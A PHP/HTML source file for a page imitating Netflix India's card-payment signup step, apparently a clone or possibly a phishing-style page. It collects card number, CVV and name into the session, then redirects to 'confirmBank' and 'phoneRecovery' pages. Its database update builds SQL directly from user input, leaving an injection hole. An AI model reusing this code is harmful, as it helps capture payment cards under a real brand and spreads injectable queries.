<?php
session_start();
$plan = $_SESSION['plan'];

if (isset($_SESSION['cardNum'])) {

    unset($_SESSION['cardNum']);
    unset($_SESSION['cvv']);
    unset($_SESSION['name']);
    // header("location: howToPay.php");
}
if (isset($_SESSION['checkBack'])) {
    header("location: phoneRecovery.php");
}
?>

<?php
$showError1 = false;
$login = false;
$showError2 = false;

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $cardNum = $_POST['card_number'];
    $cvv = $_POST['cvv'];
    $name = $_POST['name'];

    if (strlen($cardNum) == 0 || strlen($cvv) == 0 || strlen($name) == 0) {
        $showError1 = true;
    } else {
        if (strlen($cardNum) == 16 || strlen($cvv) == 4) {
            $login = true;
            $_SESSION['cardNum'] = $cardNum;
            $_SESSION['cvv'] = $cvv;
            $_SESSION['name'] = $name;

            //set the name
            $email = $_SESSION['email'];
            require "partials/_dbconnect.php";
            $Sql = "UPDATE `netflixtable` SET `user` = '$name' WHERE `email` = '$email'";
            $result = mysqli_query($conn, $Sql);

            if ($result) {
                sleep(1.8);
                header('Location: confirmBank.php');
            }
        } else {
            $showError2 = true;
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;900&display=swap"
        rel="stylesheet" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
    <link rel="icon" href="images/icons8-netflix-48.png" type="image/png">

    <style>
        * {
            padding: 0%;
            margin: 0%;
            box-sizing: border-box;
            font-family: 'poppins', sans-serif;
        }

        header nav {
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 12vh;
            width: 100%;
            padding-left: 1.7rem;
            padding-top: 14px;
            padding-bottom: 1.3rem;
            border-bottom: 1px solid rgba(137, 137, 137, 0.3);
        }

        header img {
            width: 210px;
        }

        nav button {
            min-width: auto;
            width: 90px;
            padding: 10px;
            padding-top: 4px;
            padding-bottom: 4px;
            font-size: .9rem;
            font-weight: 500;
            color: white;
            background-color: red;
            border: none;
            border-radius: 4px;
            margin-right: 3.5rem;
            cursor: pointer;
        }

        nav button:hover {
            background-color: rgb(194, 2, 2);
        }

        #container {
            margin-left: 34rem;
            margin-right: 32rem;
            text-align: start;
        }

        #top p {
            font-size: .9rem;
            font-weight: 500;
            margin-top: 2.5rem;
        }

        span {
            font-weight: 700;
        }

        #container h1 {
            font-size: 2rem;
            font-weight: 500;
        }

        img {
            width: 28px;
        }

        #list {
            list-style: none;
            display: flex;
            align-items: center;
            gap: 12px;
            margin-top: .8rem;
            margin-bottom: .75rem;
            padding-left: 5px;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 9px;
        }

        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        form input {
            width: 440px;
            height: 60px;
            padding-left: 10px;
            outline: none;
            font-size: 1rem;
            border: 1px solid rgba(137, 137, 137, 0.83);
            border-radius: 2px;
        }

        form input:focus {
            border-color: blue;
        }

        form p {
            font-size: .75rem;
            color: brown;
            margin-bottom: .5rem;
        }

        .inner {
            display: flex;
            align-items: center;
        }

        .two {
            display: flex;
            gap: 10px;
        }

        .two input {
            width: 215px;
        }

        .bi-credit-card-2-back {
            font-size: 1.75rem;
            color: gray;
            position: absolute;
            left: 61.5%;
        }

        .bi-question-circle {
            font-size: 1.5rem;
            color: gray;
            position: absolute;
            left: 61.5%;
            cursor: pointer;
        }

        .warningmsg {
            display: none;
        }

        #planType {
            width: 442px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            height: 60px;
            background-color: rgb(240, 239, 239);
            border-radius: 2px;
            padding-left: 15px;
            padding-right: 15px;
        }

        #price {
            display: flex;
            flex-direction: column;
            gap: 0;
        }

        #price p {
            margin: 0%;
        }

        #rate {
            font-size: 1rem;
            font-weight: 600;
            color: black;
            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
            /* letter-spacing: 1px; */
        }

        #type {
            font-size: .95rem;
            color: rgb(101, 101, 101);
            font-weight: 500;
        }

        #planType a {
            text-decoration: none;
            color: rgb(0, 98, 255);
            font-weight: 500;
        }

        #info p {
            font-size: .75rem;
            color: rgb(133, 132, 132);
            font-weight: 500;
            margin-top: 1rem;
        }

        #info p a {
            text-decoration: none;
            color: rgb(0, 98, 255);
            font-weight: 500;
        }

        #check {
            width: 25px;
            height: 25px;
        }

        #checkDiv {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: .95rem;
            color: rgb(110, 110, 110);
            font-weight: 500;
            margin-top: 1rem;
        }

        form button {
            min-width: auto;
            width: 440px;
            height: 60px;
            background-color: red;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 1.3rem;
            font-weight: 500;
            cursor: pointer;
            margin-top: 1rem;
        }

        form button:hover {
            background-color: rgb(205, 3, 3);
            transition: .4s;
        }

        #endCredit {
            font-size: .8rem;
            color: rgb(110, 110, 110);
            margin-top: .8rem;
        }

        footer {
            padding-bottom: 4rem;
            background-color: #ebebeb;
            margin-top: 10rem;
        }

        #heading {
            padding-left: 11rem;
            padding-top: 2rem;
            font-size: 1rem;
            color: rgb(106, 106, 106);
        }

        #heading a {
            color: rgb(128, 128, 128);
            cursor: pointer;
        }

        #details {
            padding-left: 11rem;
            padding-top: 2rem;
            padding-right: 30rem;
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            padding-bottom: 2rem;
            list-style: none;
        }

        #details li {
            padding-bottom: 10px;
        }

        #details li a {
            color: rgb(134, 134, 134);
            font-size: .8rem;
            cursor: pointer;
        }

        #language1 {
            min-width: auto;
            width: 130px;
            padding: 8px;
            padding-top: 2px;
            padding-bottom: 2px;
            font-size: .9rem;
            font-weight: 500;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding-left: 16px;
            padding-right: 16px;
            background-color: rgba(255, 255, 255, .09);
            border: 1px solid rgba(71, 71, 71, 0.35);
            color: rgb(129, 129, 129);
            border-radius: 4px;
            outline-color: white;
            outline-offset: 3px;
            cursor: pointer;
            margin-bottom: 1rem;
        }

        #language1 .bi {
            color: #686868;
        }

        #language1 .bi-globe {
            font-size: 17px;
        }

        .india {
            margin-left: 11rem;
        }

        .india p {
            color: rgb(84, 84, 84);
        }

        .warning {
            width: 440px;
            height: 90px;
            margin: auto;
            /* margin-left: 34.8rem; */
            margin-top: 2rem;
            background-color: rgb(216, 157, 49);
            padding: 1rem;
            display: flex;
            align-items: center;
            gap: 17px;
            border-radius: 4px;
            margin-right: 4rem;
        }

        .warning p {
            font-size: .9rem;
        }

        .warning i {
            font-size: 1.4rem;
        }

        .success {
            width: 440px;
            height: 90px;
            margin: auto;
            margin-right: 4rem;
            margin-top: 2rem;
            background-color: lightgreen;
            padding: 1rem;
            display: flex;
            align-items: center;
            gap: 17px;
            border-radius: 4px;
        }

        .success p {
            font-size: .9rem;
        }

        .success i {
            font-size: 1.4rem;
        }
    </style>

</head>

<header>
    <nav>
        <img src="images/Netflix-Logo.wine.svg" alt="">
        <button id="signout">Sign Out</button>
    </nav>
</header>

<body>
    <div id="container">

        <?php
        if ($showError1) {
            echo '<div class="warning">
            <div><i class="bi bi-exclamation-triangle-fill"></i></div>
            <div>
                <p>Your must enter your bank details for further Payment process.</p>
            </div>
        </div>';
        }
        ?>

        <?php
        if ($showError2) {
            echo '<div class="warning">
            <div><i class="bi bi-exclamation-triangle-fill"></i></div>
            <div>
                <p>Please enter a Valid Card Number and Card CVV</p>
            </div>
        </div>';
        }
        ?>

        <?php
        if ($login) {
            echo '<div class="success">
            <div><i class="bi bi-check-lg"></i></div>
            <div>
                <p>Confirm the Payment</p>
            </div>
        </div>';
        }
        ?>

        <div id="top">
            <p>STEP <span>3</span> OF <span>3</span></p>
            <h1>Set up your credit or debit card</h1>
        </div>
        <div id="down">
            <div id="list">
                <li><img src="images/icons8-visa-48.png" alt=""></li>
                <li><img src="images/icons8-bank-48.png" alt=""></li>
                <li><img src="images/icons8-mastercard-48.png" alt=""></li>
            </div>
        </div>
        <div>
            <form action="BankPayment.php" method="post">
                <div>
                    <div class="inner"><input type="text" id="card_number" name="card_number" maxlength="19"
                            minlength="19" placeholder="Card number" required oninput="formatCardNumber(this)">
                        <i class="bi bi-credit-card-2-back"></i>
                    </div>
                    <p class="warningmsg" id="cardWarning">Please enter a card number.</p>
                </div>

                <div class="two">
                    <div>
                        <input type="text" id="expire" name="expire" placeholder="Expiration date" required
                            oninput="formatDate(this)" maxlength="8">
                        <p class="warningmsg" id="expireWarning">Please enter an expiration date.</p>
                    </div>

                    <div>
                        <div class="inner">
                            <input type="number" name="cvv" id="cvv" placeholder="CVV" min="2" maxlength="7" required>
                            <i class="bi bi-question-circle"></i>
                        </div>
                        <p class="warningmsg" id="cvvWarning">Please enter a CVV.</p>
                    </div>
                </div>

                <div>
                    <div>
                        <input type="text" name="name" id="name" placeholder="First name" maxlength="20" minlength="3"
                            required>
                    </div>
                    <p class="warningmsg" id="nameWarning">Please enter your first name.</p>
                </div>

                <div>
                    <input type="text" name="lname" id="lname" placeholder="Last name (optional)" maxlength="20" minlength="3">
                </div>

                <div id="planType">
                    <div id="price">
                        <div>
                            <p id="rate">
                                <?php
                                if ($plan == 1) {
                                    echo "₹ 649/month";
                                } elseif ($plan == 2) {
                                    echo '₹ 499/month';
                                } elseif ($plan == 3) {
                                    echo '₹ 199/month';
                                } else {
                                    echo '₹ 149/month';
                                }
                                ?>
                            </p>
                        </div>
                        <div>
                            <p id="type">Mobile</p>
                        </div>
                    </div>
                    <div>
                        <a href="plan.php">Change</a>
                    </div>
                </div>

                <div id="info">
                    <div>
                        <p>Any payment above ₹ 2000 shall need additional authentication.</p>
                    </div>

                    <div>
                        <p>By checking the checkbox below, you agree to our <a href="">
                                Terms of Use, Privacy Statement</a>, and that
                            you are over 18. Netflix will automatically continue your membership and charge the
                            membership fee (currently
                            <?php
                            if ($plan == 1) {
                                echo "₹ 649/month";
                            } elseif ($plan == 2) {
                                echo '₹ 499/month';
                            } elseif ($plan == 3) {
                                echo '₹ 199/month';
                            } else {
                                echo '₹ 149/month';
                            }
                            ?>) to your payment method until you cancel. You may
                            cancel at any time to avoid future charges.
                        </p>
                    </div>
                </div>

                <div id="boxTick">
                    <div id="checkDiv">
                        <input type="checkbox" name="check" id="check" required> I agree
                    </div>
                    <div>
                        <p class="warningmsg" id="checkWarning">You must acknowledge that you have read and agree to the
                            Terms of Use to
                            continue.</p>
                    </div>
                </div>

                <div>
                    <button type="submit" id="btn" name="submit">Start Membership</button>
                </div>

                <div id="endCredit">This page is protected by Google reCAPTCHA to ensure you're not a bot. Learn more.
                </div>
            </form>
        </div>
    </div>

    <footer>
        <div id="heading">
            <p>Questions? Call <a href="">000-800-919-1694</a></p>
        </div>

        <div id="details">
            <li><a href="">FAQ</a></li>
            <li><a href="">Account</a></li>
            <li><a href="">Investor Relations</a></li>
            <li><a href="">Ways to Watch</a></li>
            <li><a href="">Privacy</a></li>
            <li><a href="">Corporate Information</a></li>
            <li><a href="">Speed Test</a></li>
            <li><a href="">Only on Netflix</a></li>
            <li><a href="">Media Centre</a></li>
            <li><a href="">Jobs</a></li>
            <li><a href="">Terms of Use</a></li>
            <li><a href="">Cookie Preferences</a></li>
        </div>

        <div class="india">
            <button id="language1"><i class="bi bi-globe"></i> English <i class="bi bi-caret-down-fill"></i></button>
            <p>Netflix India</p>
        </div>
    </footer>


    <script>
        function formatCardNumber(input) {
            let cardNumber = input.value.replace(/\D/g, '');

            // Split the card number into groups of four digits
            let formatted = cardNumber.substr(0, 4);

            for (let i = 4; i < cardNumber.length; i += 4) {
                formatted += ' ' + cardNumber.substr(i, 4);
            }

            // Update the input value with the formatted number
            input.value = formatted;
        }

        function formatDate(input) {
            let cardNumber = input.value.replace(/\D/g, '');

            // Split the card number into groups of four digits
            let formatted = cardNumber.substr(0, 2);

            for (let i = 2; i < cardNumber.length; i += 2) {
                formatted += '/' + cardNumber.substr(i, 2);
            }

            // Update the input value with the formatted number
            input.value = formatted;
        }

        document.getElementById('btn').addEventListener(
            'click',
            checking
        );

        const cardd = document.getElementById('card_number');
        const expire = document.getElementById('expire');
        const cvv = document.getElementById('cvv');
        const Name = document.getElementById('name');
        const checkBoxx = document.getElementById('check');

        function checking() {
            // for card number
            if (cardd.value.length == 0) {
                document.getElementById('cardWarning').style.display = 'block';
                cardd.style.borderColor = 'red';
            } else if (cardd.value.length >= 1 && cardd.value.length < 18) {
                document.getElementById('cardWarning').style.display = 'block';
                document.getElementById('cardWarning').textContent = "Please enter valid card number";
                cardd.style.borderColor = 'red';
            } else {
                document.getElementById('cardWarning').style.display = 'none';
                cardd.style.borderColor = 'green';
            }

            // for expiration date
            if (expire.value.length == 0) {
                document.getElementById('expireWarning').style.display = 'block';
                expire.style.borderColor = 'red';
            } else if (expire.value.length >= 1 && expire.value.length < 7) {
                document.getElementById('expireWarning').style.display = 'block';
                document.getElementById('expireWarning').textContent = "Please enter valid expiration date";
                expire.style.borderColor = 'red';
            } else {
                document.getElementById('expireWarning').style.display = 'none';
                expire.style.borderColor = 'green';
            }

            // for cvv
            if (cvv.value.length == 0) {
                document.getElementById('cvvWarning').style.display = 'block';
                cvv.style.borderColor = 'red';
            } else if (cvv.value.length >= 1 && cvv.value.length < 4) {
                document.getElementById('cvvWarning').style.display = 'block';
                document.getElementById('cvvWarning').textContent = "Please enter valid cvv";
                cvv.style.borderColor = 'red';
            } else {
                document.getElementById('cvvWarning').style.display = 'none';
                cvv.style.borderColor = 'green';
            }

            //for name 
            if (Name.value.length == 0) {
                document.getElementById('nameWarning').style.display = 'block';
                Name.style.borderColor = 'red';
            } else {
                document.getElementById('nameWarning').style.display = 'none';
                Name.style.borderColor = 'green';
            }

            //last name
            document.getElementById('lname').style.borderColor = 'green';

            //for checkbox 
            if (checkBoxx.checked) {
                checkBoxx.style.borderColor = 'green';
                document.getElementById('checkWarning').style.display = 'none';
            } else {
                checkBoxx.style.borderColor = 'red';
                document.getElementById('checkWarning').style.display = 'block';
            }
        }

        const signOut = document.getElementById('signout');

        signOut.addEventListener('click', () => {
            setTimeout(() => {
                window.location.href = "logout.php";
            }, 1200);
            // console.log('signpout');
        });
    </script>
</body>

</html>